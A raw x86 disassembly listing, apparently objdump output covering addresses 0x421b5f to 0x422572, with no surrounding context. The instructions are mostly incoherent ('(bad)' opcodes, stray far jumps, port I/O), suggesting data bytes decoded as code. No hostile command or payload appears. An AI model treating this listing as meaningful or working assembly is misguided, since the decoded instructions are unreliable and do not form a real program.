  421b5f:	(bad)  
  421b61:	add    ecx,DWORD PTR [esi-0x25]
  421b64:	mov    BYTE PTR [ebx+0x3e75b3e],0x3e
  421b6b:	pop    ebx
  421b6c:	add    cl,cl
  421b6e:	mov    ebp,0x3dc9004a
  421b73:	dec    ebx
  421b74:	sub    cl,0x3d
  421b77:	dec    ebx
  421b78:	add    BYTE PTR [ecx],cl
  421b7a:	mov    edx,0x3de9805a
  421b7f:	dec    ebx
  421b80:	sub    cl,0xbd
  421b83:	dec    edx
  421b84:	sub    cl,0xbd
  421b87:	pop    edx
  421b88:	add    cl,ch
  421b8a:	cmp    eax,0xbde9804b
  421b8f:	pop    edx
  421b90:	or     BYTE PTR [ecx],0x3a
  421b93:	pop    ebx
  421b94:	add    cl,cl
  421b96:	mov    ebp,0xbdc9804b
  421b9b:	dec    ebx
  421b9c:	add    cl,cl
  421b9e:	cmp    eax,0xbde9005b
  421ba3:	pop    ebx
  421ba4:	add    cl,ch
  421ba6:	cmp    eax,0xbdc9805b
  421bab:	pop    ebx
  421bac:	add    cl,ch
  421bae:	mov    ebp,0x3de9804b
  421bb3:	dec    ebx
  421bb4:	add    BYTE PTR [ecx],cl
  421bb6:	inc    edx
  421bb7:	pop    ebx
  421bb8:	or     BYTE PTR [ecx],0x3a
  421bbb:	dec    ebx
  421bbc:	add    BYTE PTR [ecx],cl
	...
  421be6:	add    BYTE PTR [eax],al
  421be8:	ret    0x805b
  421beb:	or     DWORD PTR [edx],edi
  421bed:	pop    ebx
  421bee:	or     BYTE PTR [ecx],0x42
  421bf1:	dec    ebx
  421bf2:	add    cl,ch
  421bf4:	mov    ebp,0x3de9004b
  421bf9:	pop    ebx
  421bfa:	add    cl,ch
  421bfc:	mov    ebp,0xbdc9805b
  421c01:	pop    ebx
  421c02:	add    cl,ch
  421c04:	cmp    eax,0x3dc9805b
  421c09:	dec    ebx
  421c0a:	or     cl,0xbd
  421c0d:	dec    ebx
  421c0e:	add    BYTE PTR [eax],0xa7
  421c11:	fimul  WORD PTR [edi]
  421c13:	add    BYTE PTR [edi-0x68ffffa8],cl
  421c19:	pop    eax
  421c1a:	add    cl,BYTE PTR [eax]
  421c1c:	xchg   edi,eax
  421c1d:	pop    esi
  421c1e:	add    BYTE PTR [eax],al
  421c20:	outs   dx,DWORD PTR ds:[esi]
  421c21:	pop    esi
  421c22:	add    cl,BYTE PTR [eax]
  421c24:	addr16 pop eax
  421c26:	add    BYTE PTR [eax],cl
  421c28:	push   edi
  421c29:	pop    esi
  421c2a:	add    BYTE PTR [eax],al
  421c2c:	pop    edi
  421c2d:	pop    eax
  421c2e:	add    al,BYTE PTR [eax]
  421c30:	addr16 pop eax
  421c32:	add    BYTE PTR [eax],cl
  421c34:	dec    edi
  421c35:	pop    esi
  421c36:	add    al,BYTE PTR [eax]
  421c38:	pop    edi
  421c39:	pop    esi
  421c3a:	add    BYTE PTR [eax],cl
  421c3c:	pop    edi
  421c3d:	pop    esi
  421c3e:	add    BYTE PTR [eax],cl
  421c40:	daa    
  421c41:	pop    esi
  421c42:	add    al,BYTE PTR [eax]
  421c44:	das    
  421c45:	pop    eax
  421c46:	add    cl,BYTE PTR [eax]
  421c48:	pop    ds
  421c49:	pop    esi
  421c4a:	add    al,BYTE PTR [eax]
	...
  421c74:	add    BYTE PTR [eax],al
  421c76:	pop    ss
  421c77:	pop    esi
  421c78:	add    cl,BYTE PTR [eax]
  421c7a:	addps  xmm0,XMMWORD PTR [eax]
  421c7d:	add    BYTE PTR [edi],ah
  421c7f:	pop    esi
  421c80:	add    BYTE PTR [eax],cl
  421c82:	pop    ds
  421c83:	pop    esi
  421c84:	add    BYTE PTR [eax],al
  421c86:	pop    ss
  421c87:	pop    eax
  421c88:	add    cl,BYTE PTR [eax]
  421c8a:	out    0x57,eax
  421c8c:	add    BYTE PTR [eax],al
  421c8e:	out    0x57,eax
  421c90:	add    al,BYTE PTR [eax]
  421c92:	xlat   BYTE PTR ds:[ebx]
  421c93:	pop    ebp
  421c94:	add    cl,BYTE PTR [eax]
  421c96:	fistp  WORD PTR [ebp+0x2]
  421c99:	or     bh,cl
  421c9b:	push   edi
  421c9c:	add    al,BYTE PTR [eax]
  421c9e:	iret   
  421c9f:	push   edi
  421ca0:	add    BYTE PTR [eax],cl
  421ca2:	xlat   BYTE PTR ds:[ebx]
  421ca3:	push   edi
  421ca4:	add    al,BYTE PTR [eax]
  421ca6:	xlat   BYTE PTR ds:[ebx]
  421ca7:	pop    ebp
  421ca8:	add    al,BYTE PTR [eax]
  421caa:	scas   eax,DWORD PTR es:[edi]
  421cab:	push   edi
  421cac:	add    BYTE PTR [eax],cl
  421cae:	scas   eax,DWORD PTR es:[edi]
  421caf:	pop    ebp
  421cb0:	add    BYTE PTR [eax],al
  421cb2:	ds cld 
  421cb4:	add    al,BYTE PTR [edx]
  421cb6:	ss add al,0x3
  421cb9:	add    BYTE PTR [esi],bh
  421cbb:	add    al,0x1
  421cbd:	add    BYTE PTR [esi+0x4],al
  421cc0:	add    eax,DWORD PTR [edx]
  421cc2:	ss add al,0x1
  421cc5:	add    BYTE PTR [esi],dh
  421cc7:	cld    
  421cc8:	add    BYTE PTR [edx],al
  421cca:	ds in  al,dx
  421ccc:	add    al,BYTE PTR [eax]
  421cce:	ds add al,0x1
  421cd1:	add    bh,BYTE PTR [esi]
  421cd3:	add    al,0x3
  421cd5:	add    dh,BYTE PTR [esi]
  421cd7:	add    al,0x3
	...
  421d01:	add    BYTE PTR [eax],al
  421d03:	add    BYTE PTR [esi+0x4],al
  421d06:	add    DWORD PTR [eax],eax
  421d08:	ds add al,0x3
  421d0b:	add    BYTE PTR [esi],bh
  421d0d:	cld    
  421d0e:	add    BYTE PTR [edx],al
  421d10:	ds cld 
  421d12:	add    al,BYTE PTR [edx]
  421d14:	inc    esi
  421d15:	add    al,BYTE PTR [ebx]
  421d17:	add    BYTE PTR [esi-0x16],al
  421d1a:	add    BYTE PTR [eax],al
  421d1c:	add    al,BYTE PTR ss:[ebx]
  421d1f:	add    BYTE PTR [esi],bh
  421d21:	add    al,BYTE PTR [ecx]
  421d23:	add    BYTE PTR [esi],bh
  421d25:	jmp    0x2:0xea460200
  421d2c:	add    al,BYTE PTR ss:[ecx]
  421d2f:	add    bh,BYTE PTR [esi]
  421d31:	add    al,BYTE PTR [ecx]
  421d33:	add    BYTE PTR [esi-0x16],al
  421d36:	add    al,BYTE PTR [edx]
  421d38:	inc    esi
  421d39:	jmp    0x202:0xfa3e0000
  421d40:	add    al,BYTE PTR ds:[ebx]
  421d43:	add    bh,BYTE PTR [esi]
  421d45:	jmp    0x201:0x2460000
  421d4c:	ss cli 
  421d4e:	add    al,BYTE PTR [eax]
  421d50:	ss cli 
  421d52:	add    al,BYTE PTR [eax]
  421d54:	ds pop ebx
  421d56:	out    0x3,eax
  421d58:	cmp    al,0x63
  421d5a:	out    dx,eax
  421d5b:	add    eax,0x3df5b3c
  421d60:	ds pop ebx
  421d62:	fild   WORD PTR [ebx]
  421d64:	cmp    al,0x63
  421d66:	out    0x5,eax
	...
  421d90:	add    BYTE PTR [eax],al
  421d92:	cmp    al,0x5b
  421d94:	call   0x689ddbbc
  421d99:	and    edi,DWORD PTR [esi]
  421d9b:	pop    ebx
  421d9c:	push   0x675b3e23
  421da1:	add    edi,DWORD PTR [esi]
  421da3:	pop    ebx
  421da4:	and    edi,DWORD PTR [bp+0x685b]
  421da9:	add    edi,DWORD PTR [esi-0x41fc17a5]
  421daf:	pop    ebx
  421db0:	call   0xe79d5bd8
  421db5:	add    edi,DWORD PTR [esi]
  421db7:	pop    ebx
  421db8:	out    0x23,eax
  421dba:	mov    esi,0xbe23e75b
  421dbf:	pop    edx
  421dc0:	push   0x685abe23
  421dc5:	add    edi,DWORD PTR [esi]
  421dc7:	pop    ebx
  421dc8:	out    0x3,eax
  421dca:	ds pop ebx
  421dcc:	add    edi,DWORD PTR [bp-0x17a6]
  421dd1:	add    edi,DWORD PTR [esi+0x3e03e85a]
  421dd7:	pop    ebx
  421dd8:	out    0x23,eax
  421dda:	ds pop ebx
  421ddc:	out    0x3,eax
  421dde:	mov    esi,0xbe23e85a
  421de3:	pop    edx
  421de4:	addr16 add al,0x3e
  421de7:	pop    ebx
  421de8:	out    0x3,eax
  421dea:	mov    esi,0x3e23e85a
  421def:	pop    ebx
  421df0:	addr16 and al,0x3e
  421df3:	pop    ebx
  421df4:	push   0x4
	...
  421e1d:	add    BYTE PTR [eax],al
  421e1f:	add    BYTE PTR [esi+0x3de8005a],bh
  421e25:	pop    ebx
  421e26:	add    BYTE PTR [ecx+0x62],ch
  421e29:	pop    ebx
  421e2a:	add    BYTE PTR [ecx+0x3a],ch
  421e2d:	(bad)  
  421e2f:	call   0x69427991
  421e34:	pop    edx
  421e35:	(bad)  
  421e37:	addr16 (bad) 
  421e39:	(bad)  
  421e3b:	cmp    bl,BYTE PTR [bp+di+0x0]
  421e3f:	imul   eax,DWORD PTR [edx-0x25],0xdb3de7ff
  421e46:	(bad)  
  421e47:	call   0x6841f969
  421e4c:	sbb    bl,bl
  421e4e:	jmp    DWORD PTR [edi+0x42]
  421e51:	pop    ebx
  421e52:	add    cl,ch
  421e54:	cmp    eax,0x3de9005b
  421e59:	pop    ebx
  421e5a:	add    cl,ch
  421e5c:	sbb    eax,0x2268ffdb
  421e61:	pop    ebx
  421e62:	add    BYTE PTR [ecx+0x3a],ch
  421e65:	(bad)  
  421e67:	addr16 inc edx
  421e69:	(bad)  
  421e6b:	out    0x3d,eax
  421e6d:	pop    ebx
  421e6e:	add    al,ch
  421e70:	pop    ebp
  421e71:	(bad)  
  421e73:	addr16 pop edx
  421e75:	pop    ebx
  421e76:	add    BYTE PTR [eax+0x62],ch
  421e79:	pop    ebx
  421e7a:	add    BYTE PTR [ecx+0x3a],ch
  421e7d:	pop    ebx
  421e7e:	add    BYTE PTR [eax+0x62],ch
  421e81:	(bad)  
  421e83:	add    BYTE PTR [bx+si],al
	...
  421eae:	cmp    bl,BYTE PTR [ebx+0x0]
  421eb1:	call   0xe94279f3
  421eb6:	sbb    eax,0x3de8005b
  421ebb:	(bad)  
  421ebd:	out    0x1d,eax
  421ebf:	pop    ebx
  421ec0:	add    BYTE PTR [ecx+0x1d],ch
  421ec3:	(bad)  
  421ec5:	jmp    DWORD PTR [esi+0x5a]
  421ec8:	add    BYTE PTR [eax],0xd6
  421ecb:	cmp    al,BYTE PTR [eax]
  421ecd:	add    BYTE PTR [edi+0x3a],dl
  421ed0:	add    BYTE PTR [eax],al
  421ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ed3:	pop    edx
  421ed4:	add    BYTE PTR [eax],0xa6
  421ed7:	cmp    al,BYTE PTR [eax+0x5a1700]
  421edd:	add    BYTE PTR [edi-0x58ff7fa6],dl
  421ee3:	cmp    al,BYTE PTR [eax]
  421ee5:	add    BYTE PTR [edi],ah
  421ee7:	cmp    al,BYTE PTR [eax+0x579700]
  421eed:	add    BYTE PTR [edi+0x67020857],dl
  421ef3:	pop    edx
  421ef4:	or     BYTE PTR [edx],al
  421ef6:	addr16 push edi
  421ef8:	add    BYTE PTR [edx+0x57],al
  421efb:	pop    edx
  421efc:	or     BYTE PTR [eax],al
  421efe:	push   edi
  421eff:	push   edi
  421f00:	add    BYTE PTR [eax],al
  421f02:	addr16 pop edx
  421f04:	add    BYTE PTR [eax+0x67],al
  421f07:	pop    edx
  421f08:	or     BYTE PTR [edx],al
  421f0a:	push   edi
  421f0b:	push   edi
  421f0c:	or     BYTE PTR [eax+0x57],al
  421f0f:	pop    edx
  421f10:	or     BYTE PTR [eax],al
	...
  421f3a:	add    BYTE PTR [eax],al
  421f3c:	daa    
  421f3d:	push   edi
  421f3e:	add    BYTE PTR [edx],al
  421f40:	daa    
  421f41:	push   edi
  421f42:	or     BYTE PTR [eax+0x17],al
  421f45:	push   edi
  421f46:	add    BYTE PTR [edx+0x17],al
  421f49:	pop    edx
  421f4a:	or     BYTE PTR [edx+0x27],al
  421f4d:	push   edi
  421f4e:	or     BYTE PTR [eax],al
  421f50:	daa    
  421f51:	pop    edx
  421f52:	add    BYTE PTR [eax+0x17],al
  421f55:	pop    edx
  421f56:	add    BYTE PTR [edx],al
  421f58:	pop    ss
  421f59:	pop    edx
  421f5a:	or     BYTE PTR [eax-0x19],al
  421f5d:	pop    ecx
  421f5e:	or     BYTE PTR [eax-0x19],al
  421f61:	pop    ecx
  421f62:	add    BYTE PTR [eax],al
  421f64:	xlat   BYTE PTR ds:[ebx]
  421f65:	pop    eax
  421f66:	add    BYTE PTR [eax+0x3e],al
  421f69:	add    al,0x2
  421f6b:	or     BYTE PTR [esp+eax*1+0x2],bh
  421f6f:	or     BYTE PTR [esp+eax*1+0x2],bh
  421f73:	add    BYTE PTR [esp+eax*1],bh
  421f76:	add    DWORD PTR [eax],ecx
  421f78:	jl     0x421f7e
  421f7a:	add    al,BYTE PTR [eax]
  421f7c:	inc    BYTE PTR [ebx]
  421f7e:	add    DWORD PTR [eax],eax
  421f80:	ds add al,0x1
  421f83:	add    ah,bh
  421f85:	add    eax,DWORD PTR [edx]
  421f87:	or     BYTE PTR [esp+eax*1],bh
  421f8a:	add    DWORD PTR [eax],eax
  421f8c:	cmp    al,0x4
  421f8e:	add    DWORD PTR [eax],eax
  421f90:	cld    
  421f91:	add    eax,DWORD PTR [edx]
  421f93:	or     BYTE PTR [esi],bh
  421f95:	add    al,0x1
  421f97:	or     BYTE PTR [esi],bh
  421f99:	add    al,0x2
  421f9b:	add    ah,bh
  421f9d:	add    eax,DWORD PTR [edx]
	...
  421fc7:	add    BYTE PTR [eax],al
  421fc9:	add    BYTE PTR [esi],bh
  421fcb:	add    al,0x1
  421fcd:	add    BYTE PTR [esp+eax*1],bh
  421fd0:	add    DWORD PTR [eax],eax
  421fd2:	inc    BYTE PTR [ebx]
  421fd4:	add    DWORD PTR [eax],ecx
  421fd6:	cmp    al,0x4
  421fd8:	add    al,BYTE PTR [eax]
  421fda:	cld    
  421fdb:	add    eax,DWORD PTR [edx]
  421fdd:	or     dh,bh
  421fdf:	add    eax,DWORD PTR [edx]
  421fe1:	add    BYTE PTR [esp+eax*1],bh
  421fe4:	add    DWORD PTR [eax],eax
  421fe6:	jle    0x421fea
  421fe8:	add    DWORD PTR [eax],ecx
  421fea:	jl     0x421fee
  421fec:	add    cl,BYTE PTR [eax]
  421fee:	cmp    al,0x2
  421ff0:	add    cl,BYTE PTR [eax]
  421ff2:	jle    0x421ff6
  421ff4:	add    al,BYTE PTR [eax]
  421ff6:	add    al,BYTE PTR ds:[ecx]
  421ff9:	add    BYTE PTR [edx+eax*1],bh
  421ffc:	add    DWORD PTR [eax],ecx
  421ffe:	jl     0x422002
  422000:	add    cl,BYTE PTR [eax]
  422002:	jl     0x422006
  422004:	add    cl,BYTE PTR [eax]
  422006:	add    al,BYTE PTR ds:[ecx]
  422009:	add    BYTE PTR [ebx+ebx*2-0x19],bh
  42200d:	add    dh,BYTE PTR [esi]
  42200f:	cdq    
  422010:	out    0x3,eax
  422012:	ss pop ecx
  422014:	out    0x3,eax
  422016:	ds pop ebx
  422018:	out    0x3,eax
  42201a:	inc    esi
  42201b:	fwait
  42201c:	out    0x3,eax
  42201e:	ds cdq 
  422020:	out    0x2,eax
  422022:	ss pop ebx
  422024:	out    0x2,eax
  422026:	ds pop ecx
  422028:	out    0x2,eax
  42202a:	ds fwait
  42202c:	out    0x3,eax
	...
  422056:	add    BYTE PTR [eax],al
  422058:	ss pop ebx
  42205a:	out    0x3,eax
  42205c:	ds pop ebx
  42205e:	out    0x3,eax
  422060:	inc    esi
  422061:	fwait
  422062:	out    0x2,eax
  422064:	inc    esi
  422065:	pop    ecx
  422066:	out    0x2,eax
  422068:	ds fwait
  42206a:	xlat   BYTE PTR ds:[ebx]
  42206b:	add    edi,DWORD PTR [esi]
  42206d:	cmp    esp,edi
  42206f:	add    edi,esi
  422071:	cmp    ah,bh
  422073:	ret    
  422074:	jno    0x422062
  422076:	test   bl,0x29
  422079:	cmp    esp,edi
  42207b:	add    edi,esi
  42207d:	cmp    dh,bh
  42207f:	add    edi,DWORD PTR [esi]
  422081:	pop    ebx
  422082:	test   ebx,0x3e73b11
  422088:	(bad)  
  422089:	pop    edx
  42208a:	out    0xc3,eax
  42208c:	inc    ecx
  42208d:	dec    esp
  42208e:	xlat   BYTE PTR ds:[ebx]
  42208f:	ret    
  422090:	jns    0x4220ed
  422092:	out    0x3,eax
  422094:	jle    0x4220f1
  422096:	test   DWORD PTR [ebx],0x3f73b3e
  42209c:	jle    0x4220f9
  42209e:	out    0xc3,eax
  4220a0:	sbb    DWORD PTR [edi+eiz*8+0x3],ecx
  4220a4:	ds cmp edx,edi
  4220a7:	ret    
  4220a8:	or     esp,ebp
  4220aa:	out    0x3,al
  4220ac:	ds pop ebx
  4220ae:	add    cl,bl
  4220b0:	cmp    eax,0xfdd9009b
  4220b5:	jmp    0x4220d3
  4220b7:	jmp    0xea3f0cb9
	...
  4220e4:	add    BYTE PTR [eax],al
  4220e6:	std    
  4220e7:	sub    eax,DWORD PTR [eax]
  4220e9:	stc    
  4220ea:	std    
  4220eb:	jmp    0x422109
  4220ed:	stc    
  4220ee:	cmp    eax,0x3dd9005b
  4220f3:	fwait
  4220f4:	and    cl,bl
  4220f6:	cmp    eax,0x3de9209b
  4220fb:	pop    ebx
  4220fc:	add    cl,bl
  4220fe:	jge    0x42212b
  422100:	add    cl,ch
  422102:	jge    0x42212f
  422104:	and    cl,bh
  422106:	jge    0x4220f3
  422108:	cld    
  422109:	jmp    0xe9424c8b
  42210e:	jge    0x42213b
  422110:	and    cl,ch
  422112:	cmp    eax,0x7de9205b
  422117:	jmp    0x422135
  422119:	fnstcw WORD PTR ds:0x3dd9005b
  42211f:	fwait
  422120:	and    cl,ch
  422122:	jge    0x42214f
  422124:	add    cl,bh
  422126:	jge    0x422153
  422128:	and    cl,ch
  42212a:	cmp    eax,0x7df9009b
  42212f:	jmp    0x42212d
  422131:	fnstcw WORD PTR ds:0x3de9205b
  422137:	fwait
  422138:	add    cl,ch
  42213a:	std    
  42213b:	jmp    0xf920:0x5b3de91c
  422142:	std    
  422143:	jmp    0xf920:0x5b3df9fc
	...
  422172:	add    BYTE PTR [eax],al
  422174:	std    
  422175:	sub    ah,BYTE PTR [eax]
  422177:	jmp    0x424c79
  42217c:	pop    ss
  42217d:	pop    edi
  42217e:	inc    eax
  42217f:	and    bh,ah
  422181:	push   ds
  422182:	cmp    eax,0x3d1ee700
  422187:	and    bh,ah
  422189:	pop    esi
  42218a:	add    BYTE PTR [eax],al
  42218c:	out    0x5e,eax
  42218e:	inc    eax
  42218f:	and    bh,ah
  422191:	pop    esi
  422192:	add    BYTE PTR [eax],al
  422194:	out    0x1e,eax
  422196:	std    
  422197:	jmp    edi
  422199:	pop    esi
  42219a:	inc    eax
  42219b:	and    bh,ah
  42219d:	push   ds
  42219e:	cmp    eax,0xfd1ed700
  4221a3:	call   DWORD PTR [edi-0x68ffbfa2]
  4221a9:	push   ds
  4221aa:	std    
  4221ab:	pop    ds
  4221ac:	xchg   edi,eax
  4221ad:	pop    esi
  4221ae:	add    BYTE PTR [eax],al
  4221b0:	xchg   edi,eax
  4221b1:	push   ds
  4221b2:	cmp    eax,0x5ea720
  4221b7:	and    BYTE PTR [edi+0x6700405e],dl
  4221bd:	push   ds
  4221be:	std    
  4221bf:	pop    ds
  4221c0:	xchg   edi,eax
  4221c1:	pop    esi
  4221c2:	and    BYTE PTR [eax],al
  4221c4:	gs pop esi
  4221c6:	and    BYTE PTR [eiz*2+0x5703fce6],al
  4221cd:	pop    esi
  4221ce:	add    BYTE PTR [eax],al
  4221d0:	push   edi
  4221d1:	out    0xfc,al
  4221d3:	jmp    DWORD PTR [ebp-0x1a]
  4221d6:	cld    
  4221d7:	add    eax,DWORD PTR [eax]
	...
  422201:	add    BYTE PTR [ebp-0x1a],ah
  422204:	sbb    al,0x0
  422206:	push   edi
  422207:	out    0x1c,al
  422209:	add    al,0x55
  42220b:	out    0x1c,al
  42220d:	add    al,0x27
  42220f:	pop    esi
  422210:	and    BYTE PTR [eax],al
  422212:	daa    
  422213:	pop    esi
  422214:	add    BYTE PTR [eax],al
  422216:	adc    eax,0x1504005e
  42221b:	pop    esi
  42221c:	add    BYTE PTR [eax],al
  42221e:	ds hlt 
  422220:	add    BYTE PTR [eax],al
  422222:	cmp    dh,dh
  422224:	add    BYTE PTR [eax],ah
  422226:	inc    edx
  422227:	idiv   al
  422229:	inc    DWORD PTR [ecx]
  42222b:	hlt    
  42222c:	clc    
  42222d:	(bad)  
  42222e:	cmp    eax,0x3e1ff8f6
  422233:	test   BYTE PTR [eax],0x20
  422236:	ds hlt 
  422238:	clc    
  422239:	(bad)  
  42223a:	cmp    eax,0x420000f6
  42223f:	hlt    
  422240:	add    BYTE PTR [eax],ah
  422242:	cmp    dh,ah
  422244:	clc    
  422245:	pop    ds
  422246:	inc    edx
  422247:	test   BYTE PTR [eax],0x20
  42224a:	ds hlt 
  42224c:	add    BYTE PTR [eax],ah
  42224e:	inc    edx
  42224f:	hlt    
  422250:	clc    
  422251:	push   DWORD PTR [ecx-0x5600070b]
  422257:	cmc    
  422258:	clc    
  422259:	pop    ds
  42225a:	cmp    dh,ah
  42225c:	clc    
  42225d:	pop    ds
  42225e:	test   BYTE PTR ds:[eax],0x0
  422262:	ds hlt 
	...
  422290:	inc    edx
  422291:	hlt    
  422292:	clc    
  422293:	pop    ds
  422294:	ds hlt 
  422296:	add    BYTE PTR [eax],al
  422298:	inc    edx
  422299:	hlt    
  42229a:	clc    
  42229b:	pop    ds
  42229c:	ds hlt 
  42229e:	add    BYTE PTR [eax],ah
  4222a0:	ds idiv al
  4222a3:	(bad)  
  4222a4:	cmp    eax,0x3dfff8f6
  4222a9:	test   BYTE PTR [eax],0x20
  4222ac:	cmp    dh,dh
  4222ae:	add    BYTE PTR [eax],ah
  4222b0:	inc    edx
  4222b1:	test   BYTE PTR [eax],0x0
  4222b4:	test   BYTE PTR ds:[eax],0x20
  4222b8:	repnz add BYTE PTR ds:[eax],al
  4222bc:	cmp    dh,dl
  4222be:	clc    
  4222bf:	(bad)  
  4222c0:	cmp    eax,0x5e03e75b
  4222c5:	pop    ebx
  4222c6:	out    0xfb,eax
  4222c8:	cmp    DWORD PTR [edi-0x17],ebx
  4222cb:	sti    
  4222cc:	adc    ecx,ebp
  4222ce:	call   0xe79d4cce
  4222d3:	sti    
  4222d4:	and    DWORD PTR [edi-0x17],ebx
  4222d7:	sti    
  4222d8:	stc    
  4222d9:	call   0x5f8026c6
  4222de:	jmp    0xe7a16cde
  4222e3:	add    ebx,DWORD PTR [esi]
  4222e5:	pop    edi
  4222e6:	out    0xfb,eax
  4222e8:	cmp    DWORD PTR [ebx-0x19],ebx
  4222eb:	add    edi,DWORD PTR [esi]
  4222ed:	pop    ebx
  4222ee:	jmp    0xe99d60f6
  4222f3:	sti    
	...
  42231c:	add    BYTE PTR [eax],al
  42231e:	and    DWORD PTR [edi-0x19],ebx
  422321:	add    edi,DWORD PTR [esi]
  422323:	pop    ebx
  422324:	jmp    0xe79d7524
  422329:	add    ebx,DWORD PTR [esi+0x5f]
  42232c:	out    0xfb,eax
  42232e:	mov    eax,ds:0x3e03e8e8
  422333:	pop    edi
  422334:	out    0xfb,eax
  422336:	xchg   ecx,eax
  422337:	pop    esp
  422338:	out    0xfb,eax
  42233a:	mov    eax,ebp
  42233c:	call   0x279d8144
  422341:	hlt    
  422342:	jns    0x42239c
  422344:	out    0xf3,eax
  422346:	jno    0x422330
  422348:	out    0x3,al
  42234a:	inc    edx
  42234b:	pop    ebx
  42234c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42234d:	repz cmp eax,0x3e03e74b
  422353:	dec    ebx
  422354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422355:	repz push ecx
  422357:	pop    eax
  422358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422359:	add    edi,DWORD PTR [esi]
  42235b:	pop    ebx
  42235c:	out    0x3,eax
  42235e:	ds dec ebx
  422360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422361:	add    eax,DWORD PTR [edx+0x5b]
  422364:	add    cl,ch
  422366:	cmp    eax,0x2da9105f
  42236b:	pop    esp
  42236c:	adc    cl,ch
  42236e:	sub    eax,0xde9005c
  422373:	pop    esp
  422374:	adc    BYTE PTR [ecx-0x16ffa3f3],ch
  42237a:	or     eax,0x3da9fce8
  42237f:	pop    ebx
  422380:	add    cl,ch
	...
  4223aa:	add    BYTE PTR [eax],al
  4223ac:	cmp    eax,0x3da9105f
  4223b1:	pop    ebx
  4223b2:	adc    cl,ch
  4223b4:	in     eax,dx
  4223b5:	out    0xc,eax
  4223b7:	sub    edx,ebp
  4223b9:	out    0xfc,eax
  4223bb:	jmp    0x29427f8d
  4223c0:	cmp    bl,BYTE PTR [edi+0x0]
  4223c3:	sub    DWORD PTR [edx+0x5f],eax
  4223c6:	adc    cl,ch
  4223c8:	int    0x5b
  4223ca:	adc    BYTE PTR [ecx],ch
  4223cc:	mov    dl,0xe7
  4223ce:	cld    
  4223cf:	jmp    0xe9427f11
  4223d4:	cmp    eax,0x3a29005b
  4223d9:	pop    edi
  4223da:	adc    BYTE PTR [ecx],ch
  4223dc:	inc    edx
  4223dd:	pop    ebx
  4223de:	adc    cl,ch
  4223e0:	(bad)  
  4223e1:	out    0xc,eax
  4223e3:	sub    DWORD PTR [edx+0x3de9005b],edx
  4223e9:	pop    edi
  4223ea:	add    BYTE PTR [ecx],ch
  4223ec:	jb     0x422449
  4223ee:	add    cl,ch
  4223f0:	cmp    eax,0x6de9005f
  4223f5:	pop    ebx
  4223f6:	adc    cl,ch
  4223f8:	ins    DWORD PTR es:[edi],dx
  4223f9:	out    0xfc,eax
  4223fb:	test   eax,0xa9005b3d
  422400:	cmp    eax,0x4de9105f
  422405:	out    0xfc,eax
  422407:	add    BYTE PTR [edi+0x270000eb],dl
  42240d:	jmp    0x42240b
  42240f:	sldt   WORD PTR [eax]
	...
  42243a:	out    0x5a,eax
  42243c:	add    BYTE PTR [eax],al
  42243e:	xlat   BYTE PTR ds:[ebx]
  42243f:	pop    edx
  422440:	add    BYTE PTR [eax],dl
  422442:	pop    ss
  422443:	pop    ebx
  422444:	add    al,0x10
  422446:	out    0x5a,eax
  422448:	add    al,0x10
  42244a:	daa    
  42244b:	pop    ebx
  42244c:	add    BYTE PTR [eax],dl
  42244e:	pop    ss
  42244f:	pop    ebx
  422450:	add    al,0x0
  422452:	xlat   BYTE PTR ds:[ebx]
  422453:	jmp    0x0:0x5ae70ffc
  42245a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42245b:	jmp    0x4:0x5a971000
  422462:	pop    ss
  422463:	pop    edi
  422464:	add    BYTE PTR [eax],dl
  422466:	out    0x5a,eax
  422468:	add    al,0x10
  42246a:	out    0xea,eax
  42246c:	cld    
  42246d:	(bad)  
  42246f:	out    dx,eax
  422470:	cld    
  422471:	(bad)  
  422473:	pop    edx
  422474:	add    BYTE PTR [eax],al
  422476:	addr16 out dx,eax
  422478:	add    BYTE PTR [eax],dl
  42247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247b:	jmp    0x0:0xea970000
  422482:	push   edi
  422483:	out    dx,eax
  422484:	cld    
  422485:	jmp    DWORD PTR [edi-0x11]
  422488:	cld    
  422489:	jmp    DWORD PTR [edi+0x5f]
  42248c:	add    al,0x0
  42248e:	xchg   edi,eax
  42248f:	pop    edx
  422490:	add    BYTE PTR [eax],dl
  422492:	xchg   edi,eax
  422493:	jmp    0xfffe:0x1d131000
  42249a:	addr16 pop edx
	...
  4224c8:	push   edi
  4224c9:	pop    edx
  4224ca:	add    BYTE PTR [eax],al
  4224cc:	stos   DWORD PTR es:[edi],eax
  4224cd:	push   0xe043fffd
  4224d2:	cld    
  4224d3:	(bad)  
  4224d4:	ds sbb al,0x81
  4224d7:	dec    DWORD PTR [ecx-0xc]
  4224da:	add    BYTE PTR [eax],al
  4224dc:	ds hlt 
  4224de:	add    BYTE PTR [eax],al
  4224e0:	ds ss jnp 0x4224e3
  4224e4:	xor    DWORD PTR [esp+eax*4],ebp
  4224e7:	jmp    FWORD PTR [ecx]
  4224e9:	add    BYTE PTR [ecx+0xf421ff],0x0
  4224f0:	ds hlt 
  4224f2:	add    BYTE PTR [eax],al
  4224f4:	ds pop eax
  4224f6:	jnp    0x4224f7
  4224f8:	or     eax,esi
  4224fa:	jle    0x4224fb
  4224fc:	add    DWORD PTR [eax-0x7f],esi
  4224ff:	(bad)  
  422500:	stc    
  422501:	repz add BYTE PTR [eax],al
  422504:	ds hlt 
  422506:	add    BYTE PTR [eax],al
  422508:	ds pushf 
  42250a:	jle    0x42250b
  42250c:	loope  0x42256d
  42250e:	cmp    bh,0xd9
  422511:	mov    DWORD PTR [ebx+0xf3d1ff],0xf43e00
  42251b:	add    BYTE PTR [esi],bh
  42251d:	mov    dh,0x7a
  42251f:	(bad)  
  422520:	mov    ecx,0xb1ff8237
  422525:	mov    bh,0x83
  422527:	jmp    FWORD PTR [ecx+0xf3]
	...
  422555:	add    BYTE PTR [esi],bh
  422557:	hlt    
  422558:	add    BYTE PTR [eax],al
  42255a:	ds enter 0xff7a,0x91
  42255f:	daa    
  422560:	cmp    bh,0x89
  422563:	mov    ds:0xf381ff83,eax
  422568:	add    BYTE PTR [eax],al
  42256a:	ds hlt 
  42256c:	add    BYTE PTR [eax],al
  42256e:	ds ds jl 0x422571
  422572:	imul   edx,DWORD PTR [ebx-0x7e],0x535a61ff
